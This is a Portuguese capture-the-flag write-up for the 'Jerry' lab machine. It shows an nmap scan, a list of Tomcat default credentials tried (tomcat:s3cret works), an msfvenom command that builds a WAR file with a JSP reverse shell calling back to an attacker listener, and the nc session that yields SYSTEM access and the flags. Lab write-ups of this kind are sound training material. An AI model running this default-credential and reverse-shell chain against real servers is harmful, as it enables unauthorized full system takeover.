---
title: "Jerry"
date: 2024-04-14
type: "labs"
difficulty: "Easy"
pwned: true
os: "Windows"
tags: ["windows", "tomcat", "war", "default-credentials", "msfvenom"]
summary: "Apache Tomcat com credenciais padrão (tomcat:s3cret). Upload de WAR malicioso via manager → SYSTEM imediato."
machine_info:
  IP: "10.10.10.95"
  OS: "Windows Server 2012 R2"
  Dificuldade: "Easy"
  Porta principal: "8080/tcp (Tomcat)"
---

## Reconhecimento

```bash
$ nmap -sC -sV 10.10.10.95
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth-union:
|   Apache Tomcat/7.0.88
```

Acesso ao `/manager/html` pede autenticação HTTP.

## Credenciais Padrão

Tentando credenciais comuns do Tomcat:

| Username | Password |
|----------|----------|
| admin    | admin    |
| tomcat   | tomcat   |
| tomcat   | s3cret   |

`tomcat:s3cret` funcionou.

## Geração do WAR Malicioso

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=10.10.14.X LPORT=4444 \
    -f war -o shell.war

Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: shell.war
```

## Upload e Execução

1. Tomcat Manager → Deploy → Upload `shell.war`
2. Application: `/shell` → clica em `/shell`

```bash
$ nc -lvnp 4444
Connection from 10.10.10.95

C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

**SYSTEM imediato** — o Tomcat estava rodando com privilégios máximos.

## Flags

```bash
C:\> type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"

user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

## Lição

Nunca expor o Tomcat Manager na internet. Se precisar, troque as credenciais padrão e adicione restrição por IP no `context.xml`.
